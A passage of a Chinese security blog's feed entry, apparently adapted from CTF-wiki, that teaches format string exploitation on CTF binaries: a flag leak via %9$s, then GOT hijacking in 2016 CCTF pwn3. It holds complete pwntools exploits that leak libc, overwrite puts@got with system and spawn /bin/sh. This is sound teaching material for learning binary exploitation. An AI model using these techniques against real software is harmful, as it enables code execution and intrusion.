$rsp</span><br><span class="line">0x00007fffffffdb10│+0x08: 0x0000000031000001</span><br><span class="line">0x00007fffffffdb18│+0x10: 0x0000000000602830  →  0x0000363534333231 (&quot;123456&quot;?)</span><br><span class="line">0x00007fffffffdb20│+0x18: 0x0000000000602010  →  &quot;You answered:\ng&quot;</span><br><span class="line">0x00007fffffffdb28│+0x20: 0x00007fffffffdb30  →  &quot;flag&#123;11111111111111111&quot;</span><br><span class="line">0x00007fffffffdb30│+0x28: &quot;flag&#123;11111111111111111&quot;</span><br><span class="line">0x00007fffffffdb38│+0x30: &quot;11111111111111&quot;</span><br><span class="line">0x00007fffffffdb40│+0x38: 0x0000313131313131 (&quot;111111&quot;?)</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────[ trace ]────</span><br><span class="line">[#0] 0x7ffff7a62800 → Name: __printf(format&#x3D;0x602830 &quot;123456&quot;)</span><br><span class="line">[#1] 0x400890 → Name: main()</span><br></pre></td></tr></table></figure><p>以看到 flag 对应的栈上的偏移为 5，除去对应的第一行为返回地址外，其偏移为 4。此外，由于这是一个 64 位程序，所以前 6 个参数存在在对应的寄存器中，fmt 字符串存储在 RDI 寄存器中，所以 fmt 字符串对应的地址的偏移为 10。而 fmt 字符串中 <code>%order$s</code> 对应的 order 为 fmt 字符串后面的参数的顺序，所以我们只需要输入 <code>%9$s</code> 即可得到 flag 的内容。当然，我们还有更简单的方法利用 <a href="https://github.com/scwuaptx/Pwngdb">https://github.com/scwuaptx/Pwngdb</a> 中的 fmtarg 来判断某个参数的偏移。</p><p><strong>ps:这里的10是由5+5得到的，至于为什么是这两个5是从哪里的得到的，我来解释一下，前面的5: 由于64为程序，前64个参数是存在寄存器中的，分别是rdi, rsi, rcx, rdx, r8, r9 所以第一格式化字符串是存储rdi中的，所以flag对应的偏移就应该是在 5 + flag 在线中的偏移，在栈中的偏移就很多理解了就是5，所以flag对应的格式化字符串偏移为10</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gef➤  fmtarg 0x00007fffffffdb28</span><br><span class="line">The index of format argument : 10 (&quot;\%9$p&quot;)</span><br></pre></td></tr></table></figure><p>需要注意的是我们必须 break 在 printf 处。</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">goodluck &#x3D; ELF(&#39;.&#x2F;goodluck&#39;)</span><br><span class="line">if args[&#39;REMOTE&#39;]:</span><br><span class="line">    sh &#x3D; remote(&#39;pwn.sniperoj.cn&#39;, 30017)</span><br><span class="line">else:</span><br><span class="line">    sh &#x3D; process(&#39;.&#x2F;goodluck&#39;)</span><br><span class="line">payload &#x3D; &quot;%9$s&quot;</span><br><span class="line">print payload</span><br><span class="line">##gdb.attach(sh)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">print sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h4 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[+] Starting local process &#39;.&#x2F;goodluck&#39;: pid 3129</span><br><span class="line">%9$s</span><br><span class="line">[*] Process &#39;.&#x2F;goodluck&#39; stopped with exit code 0 (pid 3129)</span><br><span class="line">what&#39;s the flag</span><br><span class="line">You answered:</span><br><span class="line">flag&#123;11111111111111&#125;</span><br><span class="line">\xff</span><br><span class="line">But that was totally wrong lol get rekt</span><br></pre></td></tr></table></figure><h2 id="hijack-GOT"><a href="#hijack-GOT" class="headerlink" title="hijack GOT"></a>hijack GOT</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>在目前的 C 程序中，libc 中的函数都是通过 GOT 表来跳转的。此外，在没有开启 RELRO 保护的前提下，每个 libc 的函数对应的 GOT 表项是可以被修改的。因此，我们可以修改某个 libc 函数的 GOT 表内容为另一个 libc 函数的地址来实现对程序的控制。比如说我们可以修改 printf 的 got 表项内容为 system 函数的地址。从而，程序在执行 printf 的时候实际执行的是 system 函数。</p><p>假设我们将函数 A 的地址覆盖为函数 B 的地址，那么这一攻击技巧可以分为以下步骤</p><ul><li><p>确定函数 A 的 GOT 表地址。</p><ul><li>这一步我们利用的函数 A 一般在程序中已有，所以可以采用简单的寻找地址的方法来找。</li></ul></li><li><p>确定函数 B 的内存地址</p><ul><li>这一步通常来说，需要我们自己想办法来泄露对应函数 B 的地址。</li></ul></li><li><p>将函数 B 的内存地址写入到函数 A 的 GOT 表地址处。</p><ul><li><p>这一步一般来说需要我们利用函数的漏洞来进行触发。一般利用方法有如下两种</p><ul><li>写入函数：write 函数。</li><li>ROP</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pop eax; ret;           # printf@got -&gt; eax</span><br><span class="line">pop ebx; ret;           # (addr_offset &#x3D; system_addr - printf_addr) -&gt; ebx</span><br><span class="line">add [eax] ebx; ret;     # [printf@got] &#x3D; [printf@got] + addr_offset</span><br></pre></td></tr></table></figure><ul><li>格式化字符串任意地址写</li></ul></li></ul></li></ul><h3 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h3><p>这里我们以 2016 CCTF 中的 <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2016-CCTF-pwn3">pwn3</a> 为例进行介绍。</p><h4 id="查看保护-1"><a href="#查看保护-1" class="headerlink" title="查看保护"></a>查看保护</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[*] &#39;&#x2F;home&#x2F;oldthree&#x2F;Desktop&#x2F;pwn3&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>可以看出程序主要开启了 NX 保护。我们一般默认远程都是开启 ASLR 保护的。</p><h4 id="分析程序-1"><a href="#分析程序-1" class="headerlink" title="分析程序"></a>分析程序</h4><p>首先分析程序，可以发现程序似乎主要实现了一个需密码登录的 ftp，具有 get，put，dir 三个基本功能。大概浏览一下每个功能的代码，发现在 get 功能中存在格式化字符串漏洞</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int get_file()</span><br><span class="line">&#123;</span><br><span class="line">  char dest; &#x2F;&#x2F; [sp+1Ch] [bp-FCh]@5</span><br><span class="line">  char s1; &#x2F;&#x2F; [sp+E4h] [bp-34h]@1</span><br><span class="line">  char *i; &#x2F;&#x2F; [sp+10Ch] [bp-Ch]@3</span><br><span class="line"></span><br><span class="line">  printf(&quot;enter the file name you want to get:&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%40s&quot;, &amp;s1);</span><br><span class="line">  if ( !strncmp(&amp;s1, &quot;flag&quot;, 4u) )</span><br><span class="line">    puts(&quot;too young, too simple&quot;);</span><br><span class="line">  for ( i &#x3D; (char *)file_head; i; i &#x3D; (char *)*((_DWORD *)i + 60) )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( !strcmp(i, &amp;s1) )</span><br><span class="line">    &#123;</span><br><span class="line">      strcpy(&amp;dest, i + 0x28);</span><br><span class="line">      return printf(&amp;dest);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return printf(&amp;dest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="漏洞利用思路"><a href="#漏洞利用思路" class="headerlink" title="漏洞利用思路"></a>漏洞利用思路</h4><p>既然有了格式化字符串漏洞，那么我们可以确定如下的利用思路</p><ul><li>绕过密码</li><li>确定格式化字符串参数偏移</li><li>利用 put@got 获取 put 函数地址，进而获取对应的 libc.so 的版本，进而获取对应 system 函数地址。</li><li>修改 puts@got 的内容为 system 的地址。</li><li>当程序再次执行 puts 函数的时候，其实执行的是 system 函数。</li></ul><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line">##context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">pwn3 &#x3D; ELF(&#39;.&#x2F;pwn3&#39;)</span><br><span class="line">if args[&#39;REMOTE&#39;]:</span><br><span class="line">    sh &#x3D; remote(&#39;111&#39;, 111)</span><br><span class="line">else:</span><br><span class="line">    sh &#x3D; process(&#39;.&#x2F;pwn3&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get(name):</span><br><span class="line">    sh.sendline(&#39;get&#39;)</span><br><span class="line">    sh.recvuntil(&#39;enter the file name you want to get:&#39;)</span><br><span class="line">    sh.sendline(name)</span><br><span class="line">    data &#x3D; sh.recv()</span><br><span class="line">    return data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def put(name, content):</span><br><span class="line">    sh.sendline(&#39;put&#39;)</span><br><span class="line">    sh.recvuntil(&#39;please enter the name of the file you want to upload:&#39;)</span><br><span class="line">    sh.sendline(name)</span><br><span class="line">    sh.recvuntil(&#39;then, enter the content:&#39;)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show_dir():</span><br><span class="line">    sh.sendline(&#39;dir&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tmp &#x3D; &#39;sysbdmin&#39;</span><br><span class="line">name &#x3D; &quot;&quot;</span><br><span class="line">for i in tmp:</span><br><span class="line">    name +&#x3D; chr(ord(i) - 1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## password</span><br><span class="line">def password():</span><br><span class="line">    sh.recvuntil(&#39;Name (ftp.hacker.server:Rainism):&#39;)</span><br><span class="line">    sh.sendline(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##password</span><br><span class="line">password()</span><br><span class="line">## get the addr of puts</span><br><span class="line">puts_got &#x3D; pwn3.got[&#39;puts&#39;]</span><br><span class="line">log.success(&#39;puts got : &#39; + hex(puts_got))</span><br><span class="line">put(&#39;1111&#39;, &#39;%8$s&#39; + p32(puts_got))</span><br><span class="line">puts_addr &#x3D; u32(get(&#39;1111&#39;)[:4])</span><br><span class="line"></span><br><span class="line">## get addr of system</span><br><span class="line">libc &#x3D; LibcSearcher(&quot;puts&quot;, puts_addr)</span><br><span class="line">system_offset &#x3D; libc.dump(&#39;system&#39;)</span><br><span class="line">puts_offset &#x3D; libc.dump(&#39;puts&#39;)</span><br><span class="line">system_addr &#x3D; puts_addr - puts_offset + system_offset</span><br><span class="line">log.success(&#39;system addr : &#39; + hex(system_addr))</span><br><span class="line"></span><br><span class="line">## modify puts@got, point to system_addr</span><br><span class="line">payload &#x3D; fmtstr_payload(7, &#123;puts_got: system_addr&#125;)</span><br><span class="line">put(&#39;&#x2F;bin&#x2F;sh;&#39;, payload)</span><br><span class="line">sh.recvuntil(&#39;ftp&gt;&#39;)</span><br><span class="line">sh.sendline(&#39;get&#39;)</span><br><span class="line">sh.recvuntil(&#39;enter the file name you want to get:&#39;)</span><br><span class="line">##gdb.attach(sh)</span><br><span class="line">sh.sendline(&#39;&#x2F;bin&#x2F;sh;&#39;)</span><br><span class="line"></span><br><span class="line">## system(&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">show_dir()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><ul><li>我在获取 puts 函数地址时使用的偏移是 8，这是因为我希望我输出的前 4 个字节就是 puts 函数的地址。其实格式化字符串的首地址的偏移是 7。</li><li>这里我利用了 pwntools 中的 fmtstr_payload 函数，比较方便获取我们希望得到的结果，有兴趣的可以查看官方文档尝试。比如这里 fmtstr_payload(7, {puts_got: system_addr}) 的意思就是，我的格式化字符串的偏移是 7，我希望在 puts_got 地址处写入 system_addr 地址。默认情况下是按照字节来写的。</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;格式化字符串漏洞原理介绍&quot;&gt;&lt;a href=&quot;#格式化字符串漏洞原理介绍&quot; class=&quot;headerlink&quot; title=&quot;格式化字符串漏洞原理介绍&quot;&gt;&lt;/a&gt;格式化字符串漏洞原理介绍&lt;/h1&gt;&lt;h2 id=&quot;格式化字符串函数介绍&quot;&gt;&lt;a href=&quot;#格式化字符串函数介绍&quot; class=&quot;headerlink&quot; title=&quot;格式化字符串函数介绍&quot;&gt;&lt;/a&gt;格式化字符串函数介绍&lt;/h2&gt;&lt;p&gt;格式化字符串函数可以接受可变数量的参数，并将&lt;strong&gt;第一个参数作为格式化字符串，根据其来解析之后的参数&lt;/strong&gt;。通俗来说，格式化字符串函数就是将计算机内存中表示的数据转化为我们人类可读的字符串格式。几乎所有的 C/C++ 程序都会利用格式化字符串函数来&lt;strong&gt;输出信息，调试程序，或者处理字符串&lt;/strong&gt;。一般来说，格式化字符串在利用的时候主要分为三个部分&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;格式化字符串函数&lt;/li&gt;
&lt;li&gt;格式化字符串&lt;/li&gt;
&lt;li&gt;后续参数，&lt;strong&gt;可选&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&quot;https://oss-map.oss-cn-beijing.aliyuncs.com/img/printf.png&quot; alt=&quot;img&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="二进制安全" scheme="http://www.ol4three.com/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="PWN" scheme="http://www.ol4three.com/tags/PWN/"/>
    
      <category term="格式化字符串" scheme="http://www.ol4three.com/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    
  </entry>
  
</feed>
